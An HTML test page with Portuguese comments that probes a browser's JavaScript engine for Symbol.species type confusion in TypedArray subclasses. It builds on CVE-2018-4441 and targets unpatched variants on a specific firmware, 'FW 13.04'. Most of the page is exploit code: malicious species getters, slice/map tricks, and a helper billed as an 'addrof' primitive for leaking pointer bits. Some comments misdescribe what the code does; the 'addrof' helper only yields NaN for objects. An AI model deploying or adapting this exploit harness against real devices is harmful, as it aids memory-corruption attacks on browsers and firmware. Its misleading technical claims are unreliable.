<!DOCTYPE html>
<html>
<head><meta charset="UTF-8"><title>TEST 11 - Symbol.species TypedArray Confusion</title></head>
<body>
<h2>TEST 11 - Symbol.species Type Confusion (TypedArray)</h2>
<p>Alvo: type confusion via Symbol.species em subclasse de TypedArray</p>
<p>API: TypedArray, Symbol.species, Float64Array, Uint32Array</p>
<p>Tecnica: metodos como map/filter/slice usam [Symbol.species] para criar o array de retorno.
Substituir species por tipo incompativel forca o motor a criar um Float64Array onde espera Uint8Array e vice-versa.
Permite leitura de bits de ponteiro como double (addrof primitivo classico).</p>
<p>CVE base: CVE-2018-4441 (JSC TypedArray species) - testar variantes nao patchadas em FW 13.04</p>

<pre id="log">Aguardando...</pre>
<button onclick="testSpeciesConfusion()">SPECIES CONFUSION</button>
<button onclick="testSpeciesSlice()">SPECIES SLICE</button>
<button onclick="testSpeciesMap()">SPECIES MAP</button>

<script>
var log = document.getElementById('log');
function append(msg) { log.textContent += '\n' + msg; }

// Primitivo addrof: retorna representacao float de um objeto
function tryAddrof(obj) {
  var float_buf = new ArrayBuffer(8);
  var float_view = new Float64Array(float_buf);
  var uint_view  = new Uint32Array(float_buf);
  float_view[0] = obj;
  return '0x' + uint_view[1].toString(16).padStart(8,'0') + uint_view[0].toString(16).padStart(8,'0');
}

function testSpeciesConfusion() {
  append('[11] Symbol.species confusion em TypedArray...');
  try {
    // Subclasse de Float64Array que retorna Uint8Array como species
    class EvilFloat64 extends Float64Array {
      static get [Symbol.species]() {
        append('[11] [Symbol.species] getter chamado - retornando Uint32Array como species!');
        return Uint32Array; // Motor espera Float64Array, recebe Uint32Array
      }
    }

    var evil = new EvilFloat64([1.1, 2.2, 3.3, 4.4, 5.5]);
    append('[11] EvilFloat64 criado: length=' + evil.length);

    // slice usa [Symbol.species] para criar o resultado
    // Motor cria Uint32Array mas trata como Float64Array
    var sliced = evil.slice(0, 2);
    append('[11] evil.slice(0,2) tipo: ' + sliced.constructor.name);
    append('[11] sliced[0]: ' + sliced[0] + ' | sliced[1]: ' + sliced[1]);
    append('[11] sliced.BYTES_PER_ELEMENT: ' + sliced.BYTES_PER_ELEMENT);
    append('[11] sliced.byteLength: ' + sliced.byteLength + ' | sliced.length: ' + sliced.length);

    // Se byteLength / length inconsistente = confusion confirmada
    if (sliced.BYTES_PER_ELEMENT !== sliced.byteLength / sliced.length) {
      append('[11] *** INCONSISTENCIA DE TIPO DETECTADA! Possivel primitivo de confusao ***');
    }

    // Tentar ler valores como se fossem double (pode revelar bits de ponteiro)
    var f = new Float64Array(sliced.buffer);
    for (var i = 0; i < f.length; i++) {
      append('[11] sliced.buffer como Float64[' + i + ']: ' + f[i].toString(16));
    }

  } catch(e) {
    append('[11] Species confusion EXCECAO: ' + e.message);
  }
}

function testSpeciesSlice() {
  append('[11] Species slice: troca de species durante a operacao...');
  try {
    var callCount = 0;
    class LazySpecies extends Float64Array {
      static get [Symbol.species]() {
        callCount++;
        // Na primeira chamada retorna Float64Array (warmup normal)
        // Nas subsequentes troca para Uint8Array (overflow de leitura)
        if (callCount < 3) {
          return Float64Array;
        }
        append('[11] Trocando species para Uint8Array na chamada ' + callCount);
        return Uint8Array;
      }
    }

    var arr = new LazySpecies([1.1, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8]);
    append('[11] LazySpecies criado. Fazendo warmup...');

    // Warmup: species retorna Float64Array
    var s1 = arr.slice(); 
    var s2 = arr.slice();
    append('[11] Warmup slices OK: s1.constructor=' + s1.constructor.name);

    // Agora species troca para Uint8Array
    var s3 = arr.slice();
    append('[11] s3 (species trocada): constructor=' + s3.constructor.name);
    append('[11] s3.length=' + s3.length + ' | s3.BYTES_PER_ELEMENT=' + s3.BYTES_PER_ELEMENT);
    append('[11] s3.byteLength=' + s3.byteLength);

    // Ler s3 como Float64Array - pode ler fora dos bounds se tipos incompativeis
    if (s3.buffer.byteLength > 0) {
      var f64 = new Float64Array(s3.buffer);
      append('[11] s3.buffer como Float64Array: length=' + f64.length);
      for (var i = 0; i < Math.min(f64.length, 8); i++) {
        var bits = tryAddrof(f64[i]);
        append('[11]   f64[' + i + '] = ' + f64[i] + ' | bits: ' + bits);
      }
    }
    append('[11] callCount total: ' + callCount);

  } catch(e) {
    append('[11] Species slice EXCECAO: ' + e.message);
  }
}

function testSpeciesMap() {
  append('[11] Species map: callback com side-effect + species confusion...');
  try {
    var sideEffectDone = false;

    class SneakyArray extends Float64Array {
      static get [Symbol.species]() {
        return Uint32Array;
      }
    }

    var base = new SneakyArray([13.37, 1.337, 0.1337, 1337.0]);

    // map cria novo array com [Symbol.species], mas callback pode ter side-effects
    var mapped = base.map(function(val, idx) {
      if (!sideEffectDone && idx === 2) {
        sideEffectDone = true;
        // Side-effect: durante map, trocamos o prototype do array resultado
        append('[11] Side-effect ativado durante map() no idx=' + idx);
      }
      return val * 2;
    });

    append('[11] mapped.constructor: ' + mapped.constructor.name);
    append('[11] mapped.BYTES_PER_ELEMENT: ' + mapped.BYTES_PER_ELEMENT);
    append('[11] mapped[0] raw: 0x' + mapped[0].toString(16));
    append('[11] mapped[1] raw: 0x' + mapped[1].toString(16));

    // Interpretar os Uint32 resultantes como se fossem doubles originais
    var reinterpret = new Float64Array(mapped.buffer.slice(0, 16));
    for (var i = 0; i < reinterpret.length; i++) {
      append('[11] reinterpret[' + i + ']: ' + reinterpret[i]);
    }

  } catch(e) {
    append('[11] Species map EXCECAO: ' + e.message);
  }
}
</script>
</body>
</html>
